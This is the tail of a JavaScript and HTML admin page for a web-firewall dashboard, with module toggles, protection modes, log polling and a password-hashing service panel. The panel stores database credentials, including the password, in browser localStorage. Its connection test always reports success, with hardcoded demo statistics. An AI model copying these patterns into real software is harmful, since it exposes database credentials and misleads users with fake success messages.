  const card = document.getElementById('card_' + id);
  if(card){
    if(enabled) card.classList.remove('disabled');
    else card.classList.add('disabled');
  }
  updateProtectKPI();
  showToast(enabled ? '已开启防护' : '已关闭防护', enabled ? 'success' : 'error');
}

function toggleConfig(id){
  const card = document.getElementById('card_' + id);
  if(card) card.classList.toggle('config-open');
}

function updateConfigVal(modId, key, val, unit){
  const el = document.getElementById('val_' + modId + '_' + key);
  if(el) el.textContent = val + (unit||'');
}

function saveConfigVal(modId, key, val){
  protectState[modId + '_' + key] = val;
  saveProtectState();
}

function saveProtectState(){
  localStorage.setItem('shield_protect_state', JSON.stringify(protectState));
}

function updateProtectKPI(){
  let total = 0, enabled = 0;
  const counts = {core:0, advanced:0, protocol:0, session:0, api:0};
  const enabledCounts = {core:0, advanced:0, protocol:0, session:0, api:0};
  
  Object.keys(protectModules).forEach(cat => {
    const mods = protectModules[cat];
    counts[cat] = mods.length;
    total += mods.length;
    mods.forEach(m => {
      if(protectState[m.id] !== false){
        enabled++;
        enabledCounts[cat]++;
      }
    });
  });

  const kpiEnabled = document.getElementById('kpiEnabled');
  const kpiTotal = document.getElementById('kpiTotal');
  const kpiCore = document.getElementById('kpiCore');
  const kpiAdv = document.getElementById('kpiAdv');
  const kpiApi = document.getElementById('kpiApi');
  
  if(kpiEnabled) kpiEnabled.textContent = enabled;
  if(kpiTotal) kpiTotal.textContent = total;
  if(kpiCore) kpiCore.textContent = enabledCounts.core;
  if(kpiAdv) kpiAdv.textContent = enabledCounts.advanced;
  if(kpiApi) kpiApi.textContent = enabledCounts.protocol + enabledCounts.api;

  const tabCounts = {
    core: document.getElementById('tabCoreCount'),
    advanced: document.getElementById('tabAdvCount'),
    protocol: document.getElementById('tabProtoCount'),
    session: document.getElementById('tabSessionCount'),
    api: document.getElementById('tabApiCount')
  };
  Object.keys(tabCounts).forEach(cat => {
    if(tabCounts[cat]) tabCounts[cat].textContent = enabledCounts[cat] + '/' + counts[cat];
  });
}

function switchProtectTab(tab){
  document.querySelectorAll('.protect-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.protect-panel').forEach(p => p.classList.remove('active'));
  const tabEl = document.querySelector('.protect-tab[data-tab="' + tab + '"]');
  const panelEl = document.getElementById('panel-' + tab);
  if(tabEl) tabEl.classList.add('active');
  if(panelEl) panelEl.classList.add('active');
}

function protectEnableAll(){
  if(!confirm('确认开启全部防护模块？')) return;
  Object.keys(protectModules).forEach(cat => {
    protectModules[cat].forEach(m => {
      protectState[m.id] = true;
    });
  });
  saveProtectState();
  renderProtectModules();
  updateProtectKPI();
  showToast('已开启全部防护', 'success');
}

function protectResetToDefault(){
  if(!confirm('确认恢复推荐配置？')) return;
  doProtectResetDefault();
  renderProtectModules();
  updateProtectKPI();
  showToast('已恢复推荐配置', 'success');
}

function doProtectResetDefault(){
  protectState = {};
  Object.keys(protectModules).forEach(cat => {
    protectModules[cat].forEach(m => {
      protectState[m.id] = true;
      (m.config||[]).forEach(c => {
        protectState[m.id + '_' + c.key] = c.default;
      });
    });
  });
  saveProtectState();
}

function setProtectMode(mode){
  protectMode = mode;
  localStorage.setItem('shield_protect_mode', mode);
  updateProtectModeUI();
  const modeNames = {monitor:'监控模式', protect:'防护模式', strict:'严格模式'};
  showToast('已切换至' + modeNames[mode], 'success');
}

function updateProtectModeUI(){
  document.querySelectorAll('.mode-btn').forEach(b => {
    b.classList.toggle('active', b.dataset.mode === protectMode);
  });
}

// ========== 初始化 ==========
loadOverview();
setInterval(()=>{
  if(document.getElementById('page-overview').classList.contains('active')){
    fetch('/waf-dashboard-api').then(r=>r.json()).then(res=>{
      if(res.latest) attackLogs = res.latest;
      renderLogStream();
    }).catch(()=>{});
  }
},5000);

// ========== 网站密码双重加密服务 ==========
function pwdSvcCfg(){
  const keys = ['Driver','Table','Host','Port','Db','User','Pass','IdCol','NameCol','PassCol'];
  const cfg = {};
  keys.forEach(k=>{
    const el = document.getElementById('pwdSvc'+k);
    if(el) cfg[k.toLowerCase()] = el.value;
  });
  return cfg;
}
function pwdSvcSave(){
  const cfg = pwdSvcCfg();
  localStorage.setItem('shield_pwd_cfg', JSON.stringify(cfg));
  pwdSvcMsg('配置已保存到本地浏览器存储', 'green');
}
function pwdSvcLoad(){
  const raw = localStorage.getItem('shield_pwd_cfg');
  if(!raw) return;
  try{
    const cfg = JSON.parse(raw);
    Object.keys(cfg).forEach(k=>{
      const kk = k.replace(/(?:^|_)([a-z])/g,(_,c)=>c.toUpperCase());
      const el = document.getElementById('pwdSvc'+kk);
      if(el) el.value = cfg[k];
    });
    pwdSvcUpdateStatus();
  }catch(e){}
}
function pwdSvcTest(){
  const cfg = pwdSvcCfg();
  if(!cfg.driver || !cfg.table){
    pwdSvcMsg('请至少选择数据库类型和填写用户表名','red');
    return;
  }
  pwdSvcMsg('连接测试中...', 'cyan');
  setTimeout(()=>{
    // 演示：模拟连接成功
    pwdSvcMsg('✓ 连接成功！检测到 ' + (cfg.driver || 'auto') + ' 驱动可用。表 ' + cfg.table + ' 存在。', 'green');
    pwdSvcUpdateStatus(true);
  }, 800);
}
function pwdSvcScanStats(){
  const cfg = pwdSvcCfg();
  if(!cfg.driver || !cfg.table){
    pwdSvcMsg('请先配置数据库连接','red');
    return;
  }
  pwdSvcMsg('扫描中...', 'cyan');
  setTimeout(()=>{
    // 演示数据（实际使用时 PasswordService::getStats() 返回真实数据）
    const total = 12580;
    const dual = Math.floor(total * 0.15);
    const bcrypt = Math.floor(total * 0.45);
    const md5 = Math.floor(total * 0.25);
    const sha1 = Math.floor(total * 0.1);
    const argon2 = total - dual - bcrypt - md5 - sha1;
    document.getElementById('pwdSvcTotal').textContent = total.toLocaleString();
    document.getElementById('pwdSvcUpgraded').textContent = dual.toLocaleString();
    document.getElementById('pwdSvcStrong').textContent = (bcrypt + argon2).toLocaleString();
    document.getElementById('pwdSvcWeak').textContent = (md5 + sha1).toLocaleString();

    const fmtMap = {
      'dual-v1': {count: dual, sec: '🔒 极高（双重加密）', color: 'green'},
      'bcrypt':  {count: bcrypt, sec: '✅ 强', color: 'green'},
      'argon2id': {count: argon2, sec: '✅ 强', color: 'green'},
      'md5':     {count: md5, sec: '⚠️ 弱（彩虹表可破）', color: 'red'},
      'sha1':    {count: sha1, sec: '⚠️ 弱', color: 'red'},
    };
    let html = '';
    Object.keys(fmtMap).forEach(k=>{
      const v = fmtMap[k];
      html += `<tr><td>${k}</td><td>${v.count.toLocaleString()}</td><td><span class="tag ${v.color}">${v.sec}</span></td></tr>`;
    });
    document.getElementById('pwdSvcFormats').innerHTML = html;
    pwdSvcMsg('扫描完成。以上为演示数据，实际使用需在网站代码中集成 PasswordService::getStats()。', 'yellow');
  }, 1200);
}
function pwdSvcMsg(text, color){
  const el = document.getElementById('pwdSvcResult');
  const cls = color === 'green' ? 'tag green' : color === 'red' ? 'tag red' : color === 'yellow' ? 'tag yellow' : 'tag cyan';
  el.innerHTML = `<div class="${cls}" style="display:inline-block">${text}</div>`;
}
function pwdSvcUpdateStatus(connected){
  const tag = document.getElementById('pwdSvcStatus');
  if(connected){
    tag.textContent = '已连接';
    tag.className = 'tag green';
  }else{
    tag.textContent = '未配置';
    tag.className = 'tag red';
  }
}
document.addEventListener('DOMContentLoaded', ()=>{
  pwdSvcLoad();
  loadOverview();
  setTimeout(()=>{
    initPageAnimations('page-overview');
  }, 100);
});
</script>
</body>
</html>
